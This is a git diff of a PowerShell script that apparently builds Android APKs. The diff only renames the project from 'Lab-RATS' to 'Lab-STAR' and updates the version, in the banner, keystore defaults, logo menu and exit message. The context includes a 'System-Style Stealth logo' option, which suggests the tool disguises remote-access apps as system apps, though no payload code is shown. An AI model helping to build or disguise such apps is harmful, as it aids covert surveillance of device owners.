@@ -1,9 +1,9 @@
 #################################################
-#          Lab-RATS APK BUILDER - PowerShell      #
-#                   v1.4.5 Hardened              #
+#          Lab-STAR APK BUILDER - PowerShell      #
+#                   v1.5.0 Hardened              #
 #                                               #
-#  Developed by: Lab-RATS.LABS         #
-#  GitHub: https://github.com/K4N3CO-LABS/Lab-RATS
+#  Developed by: Lab-STAR.LABS         #
+#  GitHub: https://github.com/K4N3CO-LABS/Lab-STAR
 #################################################
 
 $ErrorActionPreference = "Continue"
@@ -35,8 +35,8 @@ function Write-Banner {
     Write-Host " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │" -ForegroundColor Cyan
     Write-Host " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │" -ForegroundColor Cyan
     Write-Host " │                                                              │" -ForegroundColor Cyan
-    Write-Host " │ PROJECT: Lab-RATS APK Builder | v1.4.5 Hardened              │" -ForegroundColor Cyan
-    Write-Host " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-RATS           │" -ForegroundColor Cyan
+    Write-Host " │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │" -ForegroundColor Cyan
+    Write-Host " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-STAR           │" -ForegroundColor Cyan
     Write-Host " │                                                              │" -ForegroundColor Cyan
     Write-Host " └──────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
     Write-Host ""
@@ -190,8 +190,8 @@ function New-Keystore {
     # Default values
     $keyAlias = $DefaultSettings.KeyAlias
     $keystorePass = $DefaultSettings.KeystorePass
-    $cnName = "Lab-RATS Developer"
-    $orgName = "Lab-RATS.LABS"
+    $cnName = "Lab-STAR Developer"
+    $orgName = "Lab-STAR.LABS"
     $country = "US"
     $validityDays = 25 * 365
     
@@ -279,7 +279,7 @@ function Set-Logo {
     
     Write-Host "[>] Logo options:" -ForegroundColor Magenta
     Write-Host "    1. Use Recommended System-Style Stealth logo (default_app_icon.png)"
-    Write-Host "    2. Use default Lab-RATS logo (app_logo.png)"
+    Write-Host "    2. Use default Lab-STAR logo (app_logo.png)"
     Write-Host "    3. Use custom logo (provide image path)"
     Write-Host "    4. Skip (Keep project icons as is)"
     Write-Host ""
@@ -303,7 +303,7 @@ function Set-Logo {
         "2" {
             if (Test-Path $DefaultLogo) {
                 $logoPath = $DefaultLogo
-                Write-Host "[OK] Using default Lab-RATS logo" -ForegroundColor Green
+                Write-Host "[OK] Using default Lab-STAR logo" -ForegroundColor Green
             }
             else {
                 Write-Host "[!] Default logo not found at: $DefaultLogo" -ForegroundColor Red
@@ -738,7 +738,7 @@ function Show-MainMenu {
         }
         "6" {
             Write-Host "[*] Goodbye!" -ForegroundColor Cyan
-            Write-Host "    Follow: https://github.com/K4N3CO-LABS/Lab-RATS" -ForegroundColor Magenta
+            Write-Host "    Follow: https://github.com/K4N3CO-LABS/Lab-STAR" -ForegroundColor Magenta
             return
         }
         default {
